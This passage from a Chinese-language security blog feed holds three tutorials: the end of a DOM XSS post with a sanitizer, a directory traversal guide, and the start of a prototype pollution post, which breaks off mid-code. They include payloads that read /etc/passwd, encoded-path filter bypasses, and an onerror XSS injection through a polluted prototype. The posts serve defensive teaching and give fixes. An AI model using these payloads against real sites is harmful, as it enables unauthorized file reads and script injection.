punctuation\">></span></span></code></pre>\n<p>在文章的註解中還特別提到了：</p>\n<blockquote>\n<p>The malicious payload was not embedded in the raw HTML page at any time (unlike the other flavors of XSS).</p>\n</blockquote>\n<p>因為 payload 其實不存在於任何 HTML page（因為是後來才用 JavaScript 改變的），所以它不屬於 Stored 也不屬於 Reflected，是第三種新的類型的 XSS。</p>\n<p>至於修補方式的話，由於是在前端用 JavaScript render，所以編碼的工作當然就是前端的開發者要負責，一個常見的方式是這樣（程式碼取自：<a href=\"https://stackoverflow.com/questions/2794137/sanitizing-user-input-before-adding-it-to-the-dom-in-javascript\">Sanitizing user input before adding it to the DOM in Javascript</a>）：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">sanitize</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> map <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token string\">'&amp;'</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;amp;'</span><span class=\"token punctuation\">,</span><br>      <span class=\"token string\">'&lt;'</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;lt;'</span><span class=\"token punctuation\">,</span><br>      <span class=\"token string\">'>'</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;gt;'</span><span class=\"token punctuation\">,</span><br>      <span class=\"token string\">'\"'</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;quot;'</span><span class=\"token punctuation\">,</span><br>      <span class=\"token string\">\"'\"</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;#x27;'</span><span class=\"token punctuation\">,</span><br>      <span class=\"token string\">\"/\"</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;#x2F;'</span><span class=\"token punctuation\">,</span><br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><br>  <span class=\"token keyword\">const</span> reg <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">[&amp;&lt;>\"'/]</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">ig</span></span><span class=\"token punctuation\">;</span><br>  <span class=\"token keyword\">return</span> string<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>reg<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">match</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">[</span>match<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>但有一點要特別注意，那就是並不是這樣就萬事👌👌了，XSS 的防禦比較麻煩的點是要針對不同情境做處理，如同 <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\">OWASP: Cross Site Scripting Prevention Cheat Sheet</a> 中有提到的，如果你的輸出是要放到 <code>&lt;a href=&quot;&quot;&gt;</code> 裡面的話，需要考慮到 <code>javascript:alert(1)</code> 這種形式的 payload，這時候上面的 sanitize function 就沒有用了。</p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>其實一開始會發現分錯，是因為在 <a href=\"https://zeroday.hitcon.org/\">HITCON ZeroDay</a> 平台上所回報的漏洞分類被改變，才讓我意識到自己對於這幾種的分法理解錯誤，在這邊也感謝負責審查的工作人員。</p>\n<p>除了這幾種分法以外，其實也有其他種的分類方式，例如說使用者需要自己輸入 XSS payload 的 Self XSS，或者是利用 HTML 解析不一致而達成的 Mutation XSS 等等，其實都是 XSS 很有趣的應用，以後有機會再來跟大家分享。</p>\n",
      "date_published": "2021-10-11T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/directory/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/directory/",
      "title": "秒懂 Directory Traversal(目錄遍歷)",
      "content_html": "<p><img src=\"/img/posts/nick/directory/d1.jpg\" alt=\"\"></p>\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<!-- summary -->\n<p>當你把錢藏在垃圾桶，結果錢被清潔人員撿走，就只能怪自己把錢藏錯地方，或者沒有把垃圾桶上鎖，雖然上鎖只是開玩笑，但這個悲劇的原理跟目錄遍歷非常接近。</p>\n<!-- summary -->\n</br>\n<h2 id=\"directory-traversal-%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F-%3F\"><a class=\"direct-link\" href=\"#directory-traversal-%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F-%3F\">#</a> Directory Traversal 怎麼發生 ?</h2>\n<p>Directory Traversal (也被稱為 Path Traversal) 弱點是網站讓駭客有機會跨目錄或檔案讀取資料，藉此取得伺服器上非公開的檔案，如果發生了這類問題，其問題的嚴重程度與外流了那些檔案有較大的關聯，檔案中包含越多敏感資訊這問題就越嚴重，就像把錢全藏在垃圾桶一但被偷就完了。<br>\n</br></p>\n<p><img src=\"/img/posts/nick/directory/d2.jpg\" alt=\"\"></p>\n</br>\n<p>上圖是一個經典的 Directory Traversal 攻擊</p>\n<ul>\n<li>正常行為: <a href=\"https://www.test.com/?page=page.php\">https://www.test.com/?page=page.php</a></li>\n<li>攻擊行為: <a href=\"https://www.test.com/?page=../../../passwd\">https://www.test.com/?page=../../../passwd</a></li>\n</ul>\n<p>駭客藉由「<code>../</code>」可以呼叫上一層目錄的特性，讓網站從呼叫頁面改成呼叫檔案，這時候駭客就可以直接看到檔案的內容。</p>\n<h2 id=\"%E7%AF%84%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E7%AF%84%E4%BE%8B\">#</a> 範例</h2>\n<p>Directory traversal 的攻擊原理相對單純，依路徑的讀取方式可以分成 2 類，這邊用知名靶站 DVWA 各做一個簡單的示範，模擬駭客嘗試去讀取 Linux 系統存放登入資訊的檔案 (passwd)(註1)。</p>\n<h3 id=\"0.-%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B\"><a class=\"direct-link\" href=\"#0.-%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B\">#</a> 0. 正常流程</h3>\n<p>在攻擊之前必須先了解正常流程，正常狀況下這個頁面會去讀取 file1.php 來顯示。</p>\n<p>輸入參數 : <code>page=file1.php</code></p>\n<p><img src=\"/img/posts/nick/directory/d3.jpg\" alt=\"\"></p>\n<h3 id=\"1.-%E7%B5%95%E5%B0%8D%E8%B7%AF%E5%BE%91\"><a class=\"direct-link\" href=\"#1.-%E7%B5%95%E5%B0%8D%E8%B7%AF%E5%BE%91\">#</a> 1. 絕對路徑</h3>\n<p>如果你已經知道攻擊對象的系統與目錄結構，可以用絕對路徑直接去讀取目標檔案 (/etc/passwd)。</p>\n<p>輸入參數 : <code>page=/etc/passwd</code></p>\n<p><img src=\"/img/posts/nick/directory/d4.jpg\" alt=\"\"></p>\n<h3 id=\"2.-%E7%9B%B8%E5%B0%8D%E8%B7%AF%E5%BE%91\"><a class=\"direct-link\" href=\"#2.-%E7%9B%B8%E5%B0%8D%E8%B7%AF%E5%BE%91\">#</a> 2. 相對路徑</h3>\n<p>利用 <code>../</code> 可以跳回前一層目錄的特性，反覆嘗試讀取網站其他目錄的資料。</p>\n<p>輸入參數 : <code>page=../../../../../../../../../../../../etc/passwd</code></p>\n<p><img src=\"/img/posts/nick/directory/d5.jpg\" alt=\"\"></p>\n</br>\n<h2 id=\"directory-traversal-%E6%9C%83%E7%99%BC%E7%94%9F%E5%9C%A8%E5%93%AA-%3F\"><a class=\"direct-link\" href=\"#directory-traversal-%E6%9C%83%E7%99%BC%E7%94%9F%E5%9C%A8%E5%93%AA-%3F\">#</a> Directory Traversal 會發生在哪 ?</h2>\n<p>網站上只要有輸入的地方都有機會發生 Directory Traversal，但下面列出較常發生的位置並提供一個實際的發生的案例作為參考。</p>\n<h3 id=\"1.-url\"><a class=\"direct-link\" href=\"#1.-url\">#</a> 1. URL</h3>\n<p>最常見的一種，就像前述的範例藉由更改 URL 進行攻擊，利用讀取特定頁面的功能來讀取檔案。</p>\n<ul>\n<li>產品名稱: Tomcat</li>\n<li>實際案例: <a href=\"https://www.rapid7.com/db/vulnerabilities/http-tomcat-directory-traversal/\">https://www.rapid7.com/db/vulnerabilities/http-tomcat-directory-traversal/</a></li>\n</ul>\n</br>\n<p><img src=\"/img/posts/nick/directory/d6.jpg\" alt=\"\"></p>\n</br>\n<h3 id=\"2.-html-%E8%A1%A8%E5%96%AE-(form)\"><a class=\"direct-link\" href=\"#2.-html-%E8%A1%A8%E5%96%AE-(form)\">#</a> 2. HTML 表單 (form)</h3>\n<p>較常出現在上傳與下載的功能，下載功能可能導致不開放檔案被下載，上傳功能則可以藉由跨越目錄覆蓋伺服器上原本的其他檔案，能衍生非常多種類的攻擊。</p>\n<ul>\n<li>產品名稱: Joomla</li>\n<li>實際案例: <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-9364\">https://nvd.nist.gov/vuln/detail/CVE-2020-9364</a></li>\n</ul>\n</br>\n<p><img src=\"/img/posts/nick/directory/d7.jpg\" alt=\"\"></p>\n</br>\n<h3 id=\"3.-http-header-%E6%AC%84%E4%BD%8D\"><a class=\"direct-link\" href=\"#3.-http-header-%E6%AC%84%E4%BD%8D\">#</a> 3. HTTP Header 欄位</h3>\n<p>最常被忽略的一種攻擊，網站從 Header 讀取參數的時候讀到惡意資訊，但攻擊者較不容易藉此得到回傳資料，通常要搭配其他弱點來攻擊。</p>\n<ul>\n<li>產品名稱: Jenkins</li>\n<li>實際案例: <a href=\"https://support.ixiacom.com/strikes/exploits/webapp/traversal/cve_2018_1999002_jenkins_accept_language_header_directory_traversal.xml\">https://support.ixiacom.com/strikes/exploits/webapp/traversal/cve_2018_1999002_jenkins_accept_language_header_directory_traversal.xml</a><br>\n<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-1999002\">https://nvd.nist.gov/vuln/detail/CVE-2018-1999002</a></li>\n</ul>\n</br>\n<p><img src=\"/img/posts/nick/directory/d8.jpg\" alt=\"\"></p>\n</br>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>Directory Traversal 雖然原理簡單影響卻很大，而且連知名的產品也不斷發生這類問題，近期最嚴重的應該就是 <a href=\"https://www.bleepingcomputer.com/news/security/apache-fixes-actively-exploited-zero-day-vulnerability-patch-now/\">Apache(CVE-2021-41773)</a>，這類問題反覆出現的主因是讀檔功能在網站上實在是太常見了，一有疏漏就會導致 Directory Traversal 發生，發生之後還能衍生出很多種攻擊，像是上傳後門來取得控制權。</p>\n<hr>\n<p><strong>解決方案（一） :  權限控管</strong></p>\n<p>正確的設定目錄底下的權限，當駭客透過 Directory Traversal 存取檔案時，存取到沒有權限的目錄時，便無法顯示。要特別注意把網站跑起來的時候不能用太高權限的帳號，像是 root，否則權限控管很可能形同虛設。</p>\n<hr>\n<p><strong>解決方案（二） :  輸入驗證</strong></p>\n<p>檢查特定危險字串，包含「<code>../</code>」、「<code>..\\</code>」、「<code>..</code>」的輸入都要被過濾掉，除此之外還要過濾掉特殊符號「<code>%</code>」，因為駭客可以藉由 URI 解碼來繞過驗證( ex.「<code>%2e%2e%2f</code>」 等同於 「<code>../</code>」)，而且為了預防駭客找到新的繞過方法，最好禁用未使用的符號。</p>\n<hr>\n<p><strong>解決方案（三） :  安全性設定</strong></p>\n<p>確認架站工具本身有沒有 Directory Traversal 弱點，如果有弱點儘早升級到最新或安全的版本，如果不能立刻升級應該關閉有該弱點的功能，或者使用安全性套件做把關，如果是已上線的產品為了穩定性不願意動網站伺服器的設定，就盡量落實前兩個解決方案。</p>\n<hr>\n<p>文章為快速說明原理所以挑了一些簡單易懂的攻擊來示範，實際上還有更多進階的攻擊手法，如果閱覽數量夠多，之後會再加開一篇分享一些更進階的用法與經典案例，有任何資安方面相關的問題都歡迎留言討論，或者直接到 <a href=\"https://cymetrics.io/\">Cymetrics</a> 尋求協助。</p>\n",
      "date_published": "2021-10-05T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/prototype-pollution/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/prototype-pollution/",
      "title": "基於 JS 原型鏈的攻擊手法：Prototype Pollution",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<!-- summary -->\n<p>身為一個前端工程師，或是一個會寫 JavaScript 的人，你一定多少有聽過 prototype 這個名詞，甚至面試的時候也會考到相關的題目。</p>\n<p>但你可能沒聽過的是，在 JavaScript 中有一種攻擊手法跟原型鏈息息相關，利用原型鏈這個功能的特性來進行攻擊——Prototype pollution，通常翻做原型鏈污染，就是這麼有趣而且破壞力十足的一個攻擊手法。</p>\n<!-- summary -->\n<h2 id=\"%E5%8E%9F%E5%9E%8B%E9%8F%88\"><a class=\"direct-link\" href=\"#%E5%8E%9F%E5%9E%8B%E9%8F%88\">#</a> 原型鏈</h2>\n<p>JavaScript 中的物件導向跟其他程式語言比較不一樣，你現在看到的 <code>class</code> 那是 ES6 以後才有的語法，在這之前都是用 <code>prototype</code> 來做這件事情，又稱為原型繼承。</p>\n<p>舉個例子好了，你有沒有想過當你在用一些內建函式的時候，這些函式是從哪裡來的？</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> str <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><br><span class=\"token keyword\">var</span> str2 <span class=\"token operator\">=</span> str<span class=\"token punctuation\">.</span><span class=\"token function\">repeat</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// repeat 是哪裡來的？</span></code></pre>\n<p>甚至你會發現，兩個不同字串的 repeat 方法，其實是同一個 function：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> str <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><br><span class=\"token keyword\">var</span> str2 <span class=\"token operator\">=</span> <span class=\"token string\">\"b\"</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">.</span>repeat <span class=\"token operator\">===</span> str2<span class=\"token punctuation\">.</span>repeat<span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span></code></pre>\n<p>或是如果你曾經查過 MDN，會發現標題不是 repeat，而是 <code>String.prototype.repeat</code>：</p>\n<p><img src=\"/img/posts/huli/prototype-pollution/1-repeat.png\" alt=\"string.prototype.repeat\"></p>\n<p>而這一切的一切，都與 prototype 有關。</p>\n<p>當你在呼叫 <code>str.repeat</code> 的時候，並不是 str 這個 instance 上面真的有一個方法叫做 repeat，那既然如此，JS 引擎背後是怎麼運作的？</p>\n<p>還記得 scope 的概念嗎？假設我用了一個變數，local scope 找不到，JS 引擎就會去上一層 scope 找，然後一路找到 global scope 為止，這又稱為 scope chain，JS 引擎沿著這條鏈不斷往上尋找，直到最頂端才停下來。</p>\n<p>Prototype chain 的概念其實是一模一樣的，但差別在於：「JS 引擎怎麼知道上一層是哪裡？」，如果 JS 引擎在 <code>str</code> 身上找不到 repeat 這個 function，那它該去哪裡找呢？</p>\n<p>在 JS 中有一個隱藏的屬性，叫做 <code>__proto__</code>，它儲存的值就是 JS 引擎應該往上找的地方。</p>\n<p>例如說：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> str <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">.</span>__proto__<span class=\"token punctuation\">)</span> <span class=\"token comment\">// String.prototype</span></code></pre>\n<p><code>str.__proto__</code> 所指向的東西，就是 JS 引擎在 str 身上找不到東西時，應該去的「上一層」，而這個上一層會是 <code>String.prototype</code>。</p>\n<p>這解釋了為什麼 MDN 上面不寫 repeat，而是寫 <code>String.prototype.repeat</code>，因為這才是 repeat function 的全名，這個 repeat 函式其實是存在於 <code>String.prototype</code> 這個物件上的一個方法。</p>\n<p>因此，當你在呼叫 <code>str.repeat</code> 的時候，其實就是在呼叫 <code>String.prototype.repeat</code>，而這就是原型鏈的原理跟運作方式。</p>\n<p>除了字串以外，其他東西也是一樣的，例如說物件：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token comment\">// undefined</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>toString<span class=\"token punctuation\">)</span> <span class=\"token comment\">// ƒ toString() { [native code] }</span></code></pre>\n<p>明明 obj 就是一個空物件，為什麼 <code>obj.toString</code> 有東西？因為 JS 引擎在 obj 找不到，所以就去 <code>obj.__proto__</code> 找，而這個 <code>obj.__proto__</code> 所指向的地方是 <code>Object.prototype</code>，所以 <code>obj.toString</code> 最後找到的其實是 <code>Object.prototype.toString</code>。</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>toString <span class=\"token operator\">===</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>toString<span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span></code></pre>\n<h2 id=\"%E6%94%B9%E8%AE%8A%E9%A0%90%E8%A8%AD-prototype-%E4%B8%8A%E7%9A%84%E5%B1%AC%E6%80%A7\"><a class=\"direct-link\" href=\"#%E6%94%B9%E8%AE%8A%E9%A0%90%E8%A8%AD-prototype-%E4%B8%8A%E7%9A%84%E5%B1%AC%E6%80%A7\">#</a> 改變預設 prototype 上的屬性</h2>\n<p>字串的 <code>__proto__</code> 會是 <code>String.prototype</code>，數字的 <code>__proto__</code> 會是 <code>Number.prototype</code>，而陣列的則是 <code>Array.prototype</code>，這些關聯都是已經預設好的了，原因就是要讓這些類別的東西可以共用同一個 function。</p>\n<p>如果每一個字串都有自己的 <code>repeat</code>，那一百萬個字串就有一百萬個不同的 repeat，但其實做的事情都一樣，聽起來不太合理對吧？所以透過 prototype ，我們就可以把 <code>repeat</code> 放在 <code>String.prototype</code>，這樣每個字串在使用這個函式時，呼叫到的都會是同一個函式。</p>\n<p>你可能會好奇說，既然呼叫到的是同個函式，參數也都一樣，那函式要怎麼區分出是不同的字串在呼叫它？</p>\n<p>答案就是：this，底下直接看個例子：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">first</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><br><span class=\"token punctuation\">}</span><br><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">first</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// undefined</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"abc\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">first</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// a</span></code></pre>\n<p>首先，我在 <code>String.prototype</code> 上面加了一個方法叫做 <code>first</code>，所以當我呼叫 <code>&quot;&quot;.first</code> 的時候，JS 引擎沿著 <code>__proto__</code> 找到了 <code>String.prototype</code>，發現了 <code>String.prototype.first</code> 是存在的，就呼叫了這個函式。</p>\n<p>而又因為 this 的規則，當 <code>&quot;&quot;.first()</code> 這樣寫的時候，在 <code>first</code> 中拿到的 this 會是 <code>&quot;&quot;</code>；若呼叫的是 <code>&quot;abc&quot;.first()</code>，<code>first</code> 中拿到的 this 就會是 <code>&quot;abc&quot;</code>，因此我們可以用 this 來區分現在是誰在呼叫。</p>\n<p>像上面那樣 <code>String.prototype.first</code> 的寫法，就是直接去修改 String 的原型，加上一個新的方法，讓所有字串都可以用到這個新的 method。雖然很方便沒錯，但是這樣的方式在開發上是不被推薦的，有一句話是這樣說的：<a href=\"https://humanwhocodes.com/blog/2010/03/02/maintainable-javascript-dont-modify-objects-you-down-own/\">Don't modify objects you don't own</a>。例如說 MooTools 就因為做了類似的事情，導致一個 array 的 method 要換名稱，詳情請看我以前寫過的：<a href=\"https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/\">Don’t break the Web：以 SmooshGate 以及 <keygen> 為例</a>。</p>\n<p>然後，既然 <code>String.prototype</code> 可以修改，那理所當然 <code>Object.prototype</code> 也可以修改，像是這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> <span class=\"token number\">123</span><br><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 123</span></code></pre>\n<p>因為修改了 <code>Object.prototype</code> 的緣故，所以在存取 <code>obj.a</code> 的時候，JS 引擎在 obj 身上找不到 a 這個屬性，於是去 <code>obj.__proto__</code> 也就是 <code>Object.prototype</code> 找，在那上面找到了 a，於是就回傳這個 a 的值。</p>\n<p>當程式出現漏洞，導致可以被攻擊者拿去改變原型鏈上的屬性，就叫做 prototype pollution。Pollution 是污染的意思，就像上面這個 object 的例子，我們透過 <code>Object.prototype.a = 123</code> 「污染」了物件原型上的 <code>a</code> 這個屬性，導致程式在存取物件時，有可能出現意想不到的行為。</p>\n<p>那這會造成什麼後果呢？</p>\n<h2 id=\"%E6%B1%A1%E6%9F%93%E4%BA%86%E5%B1%AC%E6%80%A7%E4%BB%A5%E5%BE%8C%E5%8F%AF%E4%BB%A5%E5%B9%B9%E5%98%9B%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E6%B1%A1%E6%9F%93%E4%BA%86%E5%B1%AC%E6%80%A7%E4%BB%A5%E5%BE%8C%E5%8F%AF%E4%BB%A5%E5%B9%B9%E5%98%9B%EF%BC%9F\">#</a> 污染了屬性以後可以幹嘛？</h2>\n<p>假設今天網站上有個搜尋功能，會從 query string 裡面拿 <code>q</code> 的值，然後寫到畫面上去，呈現出來像是這樣：</p>\n<p><img src=\"/img/posts/huli/prototype-pollution/2-search.png\" alt=\"search\"></p>\n<p>而整段程式碼是這樣寫的：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// 從網址列上拿到 query string</span><br><span class=\"token keyword\">var</span> qs <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URLSearchParams</span><span class=\"token punctuation\">(</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">.</span><span class=\"token function\">slice</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br><span class=\"token comment\">// 放上畫面，為了避免 XSS 用 innerText</span><br>document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>  tag<span class=\"token operator\">:</span> <span class=\"token string\">'h2'</span><span class=\"token punctuation\">,</span><br>  innerText<span class=\"token operator\">:</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Search result for </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>qs<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'q'</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br><span class=\"token comment\">// 簡化建立元件用的函式</span><br><span class=\"token keyword\">function</span> <span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">config</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> element <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>tag<span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>innerHTML<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    element<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>innerHTML<br>  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>    element<span class=\"token punctuation\">.</span>innerText <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>innerText<br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">return</span> element<br><span class=\"token punctuation\">}</span></code></pre>\n<p>上面這段程式碼應該沒什麼問題對吧？我們寫了一個 function <code>createElement</code> 幫我們簡化一些步驟，根據傳進來的 config 決定要產生什麼元件。為了避免 XSS，所以我們用 <code>innerText</code> 而不是 <code>innerHTML</code>，萬無一失，絕對不會有 XSS！</p>\n<p>看起來是這樣沒錯，但如果在執行到這一段程式碼以前有個 prototype pollution 的漏洞，能讓攻擊者污染到原型上的屬性呢？例如說像是這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// 先假設可以污染原型上的屬性</span><br><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token string\">'&lt;img src=x onerror=alert(1)>'</span><br><br><span class=\"token comment\">// 底下都跟剛剛一樣</span><br><span class=\"token keyword\">var</span> qs <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URLSearchParams</span><span class=\"token punctuation\">(</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">.</span><span class=\"token function\">slice</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>  tag<span class=\"token operator\">:</span> <span class=\"token string\">'h2'</span><span class=\"token punctuation\">,</span><br>  innerText<span class=\"token operator\">:</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Search result for </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>qs<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'q'</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">function</span> <span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">config</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> element <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>tag<span class=\"token punctuation\">)</span><br>  <span class=\"token comment\">// 這一行因為原型鏈被污染，所以 if(config.innerHTML) 的結果會是 true</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>innerHTML<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    element<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>innerHTML<br>  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>    element<span class=\"token punctuation\">.</span>innerText <span class=\"token operator\">=</span> config<span class=\"token 